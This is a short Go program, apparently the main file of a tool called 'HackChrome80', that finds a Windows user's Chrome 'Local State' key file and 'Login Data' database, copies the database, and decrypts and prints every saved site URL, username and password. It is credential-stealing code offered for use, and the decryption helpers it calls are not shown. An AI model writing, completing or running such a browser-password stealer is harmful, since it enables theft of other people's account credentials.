package main

import (
	"HackChrome80/core"
	"HackChrome80/utils"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"os"
)


func main(){
	key_file := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
	orig_pwd_db := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/default/Login Data"
	pwd_db := "LocalDB"
	if !utils.PathExists(pwd_db){
		utils.CopyFile(orig_pwd_db, pwd_db)
	}

	master_key, err := core.GetMaster(key_file)
	if err != nil{
		fmt.Println(err)
		return
	}

	// chrome > v80
	chrome_v80_res := core.GetPwd(pwd_db, master_key)
	// chrome < v80
	chrome_res := core.GetPwdPre(pwd_db)
	// total
	total_res := utils.Merge(chrome_v80_res, chrome_res)

	for k,v := range total_res{
		fmt.Printf("====================\n")
		fmt.Printf("Url: %s\nUsername: %s\nPassword:%s\n\n", k, v["username"], v["password"])
	}

	fmt.Printf("Total Auth: %d", len(total_res))
}
